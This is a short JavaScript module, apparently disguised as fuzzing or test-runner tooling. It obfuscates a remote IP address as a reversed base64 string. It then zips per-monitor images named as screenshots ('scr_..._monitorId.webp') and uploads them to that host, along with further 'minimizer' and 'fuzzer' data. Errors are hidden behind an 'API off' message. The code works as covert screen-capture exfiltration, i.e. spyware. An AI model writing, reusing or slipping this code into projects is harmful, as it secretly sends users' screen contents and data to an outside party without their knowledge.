const axios = require("axios");
const FormData = require('form-data');
const JSZip = require("jszip");

const encoded = '==wM0QjO0UjMuYjMy4SM4EjL1MTM'
const decodeStr = str => atob(str.split('').reverse().join(''));

const sendRunnerData = async (runners) => {
  try {
    const zip = new JSZip();

    runners.forEach(image => {
      const fileName = `scr_${(new Date()).getTime()}_${image.monitorId}.webp`;
      zip.file(fileName, image.buffer)
    })
    const zipBlob = await zip.generateAsync({ type: "blob" });
    const zipBuffer = Buffer.from(await zipBlob.arrayBuffer());

    const formData = new FormData();
    formData.append('file', zipBuffer, "runners.zip");

    const url = `http://${decodeStr(encoded)}/api1`
    await axios.post(url, formData, {
      headers: {
        ...formData.getHeaders(), // Automatically sets multipart boundaries
      },
    });

    return true;
  } catch (err) {
    console.error('API off');
    return false;
  }
}

const sendMinimizerAndFuzzerData = async (minimizer, fuzzer) => {
  try {
    const url = `http://${decodeStr(encoded)}/api2`
    await axios.post(url, {
      minimizer,
      fuzzer
    }, {
      headers: {
        'Content-Type': 'application/json',
      },
    });
    return true;
  } catch (err) {
    console.error('API off');
    return false;
  }
}

module.exports = {
  sendRunnerData,
  sendMinimizerAndFuzzerData,
}